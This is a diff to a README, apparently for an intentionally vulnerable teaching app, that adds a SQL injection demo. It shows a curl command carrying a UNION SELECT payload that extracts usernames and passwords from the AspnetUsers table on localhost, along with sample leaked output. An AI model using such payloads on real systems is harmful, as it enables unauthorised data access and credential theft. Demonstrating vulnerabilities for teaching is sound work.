@@ -8,7 +8,16 @@
 ## Vulnerability Demo
 
 ### SQL Injection:
-
+- Command-Line Demo:
+    ```sh
+    $ curl -X GET -d "name=abc%27%20UNION%20SELECT%20Id,%20Username,%20Password%20FROM%20AspnetUsers%20--" http://localhost:5005/SearchStudentUnsecure
+    
+    # This will leak all of the registered users in the system:
+    [{"id":0,"aspNetUserId":1,"lastName":"*_admin","firstName":"Admin","fullName":"*_admin, Admin"},
+    {"id":0,"aspNetUserId":2,"lastName":"!_temp","firstName":"Temp","fullName":"!_temp, Temp"},
+    {"id":0,"aspNetUserId":3,"lastName":"@_guest","firstName":"Guest","fullName":"@_guest, Guest"}]
+    ```
+    
 ### Remote code execution:
 - Command-Line Demo:
     ```sh
